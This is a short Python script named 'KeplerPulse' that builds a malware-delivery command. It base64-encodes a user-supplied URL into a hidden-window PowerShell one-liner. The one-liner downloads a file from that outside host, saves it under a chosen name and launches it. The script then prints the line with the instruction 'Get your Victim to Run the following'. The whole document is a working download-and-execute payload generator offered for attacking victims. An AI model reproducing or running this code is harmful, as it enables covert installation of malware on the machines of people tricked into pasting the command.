#!/usr/bin/python3

from colorama import Fore, Style
import colorama
import time
import os, argparse
import base64

banner = """
██╗  ██╗███████╗██████╗ ██╗     ███████╗██████╗     ██████╗ ██╗   ██╗██╗     ███████╗███████╗
██║ ██╔╝██╔════╝██╔══██╗██║     ██╔════╝██╔══██╗    ██╔══██╗██║   ██║██║     ██╔════╝██╔════╝
█████╔╝ █████╗  ██████╔╝██║     █████╗  ██████╔╝    ██████╔╝██║   ██║██║     ███████╗█████╗  
██╔═██╗ ██╔══╝  ██╔═══╝ ██║     ██╔══╝  ██╔══██╗    ██╔═══╝ ██║   ██║██║     ╚════██║██╔══╝  
██║  ██╗███████╗██║     ███████╗███████╗██║  ██║    ██║     ╚██████╔╝███████╗███████║███████╗
╚═╝  ╚═╝╚══════╝╚═╝     ╚══════╝╚══════╝╚═╝  ╚═╝    ╚═╝      ╚═════╝ ╚══════╝╚══════╝╚══════╝

"""
def __main__():
    powershell_ = r"""
    powershell.exe -windowstyle hidden $a = [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('{source}')); (new-object System.Net.WebClient).DownloadFile($a,'{dest}'); Start-Process "{dest}"
    """
    
    parser = argparse.ArgumentParser(description="KeplerPulse")
    parser.add_argument("--p", required=True, help="URL or Link to file to Download and Execute.")
    parser.add_argument("--t", required=True,help="Target to save as.")
    arguments = parser.parse_args()

    # Get path to payload
    payload = arguments.p
    dest = arguments.t
    stamp = str(time.strftime("%m/%d/%m"))
    print(Style.BRIGHT + Fore.LIGHTRED_EX + banner + Style.RESET_ALL)
    encoded = base64.b64encode(payload.encode())
    old = powershell_.replace("{source}", encoded.decode())
    new = old.replace("{dest}", dest)
   
    print("[ "+stamp+" ] "+Fore.LIGHTCYAN_EX + ">> Get your Victim to Run the following "+ Style.RESET_ALL)
    print("[ "+stamp+" ] "+Fore.LIGHTCYAN_EX + "{code}\n".format(code=new))


if __name__ == "__main__":
    __main__()

